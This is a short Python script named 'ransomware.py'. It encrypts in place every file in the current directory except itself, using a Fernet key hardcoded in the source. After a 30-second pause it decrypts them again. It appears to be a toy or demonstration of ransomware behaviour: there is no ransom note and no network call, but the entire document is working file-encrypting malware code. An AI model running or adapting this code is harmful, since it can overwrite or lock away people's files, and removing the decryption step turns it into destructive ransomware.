import os
from cryptography.fernet import Fernet
from time import sleep


key = b'znUiQoxmzAEvm_WWcQngapMLv_dLrf5C661SL-ZyL6Q='


files = []

for file in os.listdir():
    if file == 'ransomware.py':
        continue
    if os.path.isfile(file):
        files.append(file)
        

for file in files:
    with open(file, 'rb') as contents:
        file_contents = contents.read()
    encryptografed_contents = Fernet(key).encrypt(file_contents)
    
    with open(file, 'wb') as content:
        content.write(encryptografed_contents)
        
sleep(30)

for file in files:
    with open(file, 'rb') as contents:
        file_contents = contents.read()
    descryptografed_contents = Fernet(key).decrypt(file_contents)

    with open(file, 'wb') as content:
        content.write(descryptografed_contents)
